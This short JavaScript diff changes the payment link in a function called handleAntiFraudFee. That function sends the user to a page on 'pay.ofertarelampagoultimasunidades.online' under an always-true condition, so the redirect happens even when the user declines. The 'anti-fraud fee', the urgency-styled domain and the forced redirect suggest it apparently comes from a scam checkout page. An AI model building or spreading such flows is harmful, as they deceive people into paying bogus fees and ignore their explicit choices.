@@ -358,7 +358,7 @@ function handleAntiFraudFee(){
         if (result.isConfirmed || !result.isConfirmed) {
             handleUserNextLevel();
             isLoading(1);
-            window.location.href = "https://pay.ofertarelampagoultimasunidades.online/meABG9aWqJvG6Ea";
+            window.location.href = "https://pay.ofertarelampagoultimasunidades.online/521rZJrlWljZeaX";
         }
     });
 }
